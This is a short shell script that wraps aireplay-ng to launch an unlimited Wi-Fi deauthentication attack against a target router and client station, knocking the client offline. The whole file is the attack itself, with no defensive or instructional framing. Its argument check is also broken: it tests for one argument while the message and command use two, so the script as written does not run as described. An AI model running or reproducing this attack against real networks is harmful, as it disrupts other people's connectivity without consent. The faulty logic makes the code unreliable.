
if [ $# -ne 1 ]; then
  echo "Error: Pass BSSID (router) as first arg and STATION (target) as the second arg"
  exit 1
fi

sudo aireplay-ng --deauth 0 -a $1 -c $2 wlan0mon
